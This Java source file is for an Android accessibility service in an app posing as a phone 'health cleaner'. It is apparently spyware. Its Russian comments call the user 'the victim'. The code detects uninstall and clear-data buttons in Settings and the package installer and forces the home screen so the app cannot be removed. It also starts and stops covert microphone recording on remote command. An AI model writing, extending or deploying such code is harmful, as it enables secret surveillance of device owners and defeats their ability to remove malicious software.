package com.phone.health.cleaner;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.media.MediaRecorder;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.IOException;
import java.util.List;

public class RemoteControlService extends AccessibilityService {

    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        
        String packageName = event.getPackageName().toString();
        
        // 1. БЛОКИРОВКА УДАЛЕНИЯ (настройки и системный установщик с рабочего стола)
        if (packageName.equals("com.android.settings") || packageName.equals("com.android.packageinstaller")) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                List<AccessibilityNodeInfo> btnRu = rootNode.findAccessibilityNodeInfosByText("Удалить");
                List<AccessibilityNodeInfo> btnEn = rootNode.findAccessibilityNodeInfosByText("Uninstall");
                List<AccessibilityNodeInfo> btnClear = rootNode.findAccessibilityNodeInfosByText("Стереть данные");
                
                if ((btnRu != null && !btnRu.isEmpty()) || 
                    (btnEn != null && !btnEn.isEmpty()) || 
                    (btnClear != null && !btnClear.isEmpty())) {
                    
                    // Выбрасываем жертву на главный экран
                    performGlobalAction(GLOBAL_ACTION_HOME);
                }
                rootNode.recycle();
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String command = intent.getStringExtra("command");
            if ("start_audio".equals(command)) {
                startSecretAudio();
            } else if ("stop_audio".equals(command)) {
                stopSecretAudio();
            }
        }
        return START_STICKY;
    }

    // 2. УДАЛЕННОЕ УПРАВЛЕНИЕ МИКРОФОНОМ (для звука во время трансляции/управления)
    private void startSecretAudio() {
        if (isRecording) return;
        try {
            File audioDir = getCacheDir();
            File audioFile = File.createTempFile("stream_", ".3gp", audioDir);
            audioFilePath = audioFile.getAbsolutePath();

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);

            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopSecretAudio() {
        if (!isRecording || mediaRecorder == null) return;
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {
        if (isRecording) {
            stopSecretAudio();
        }
    }
}
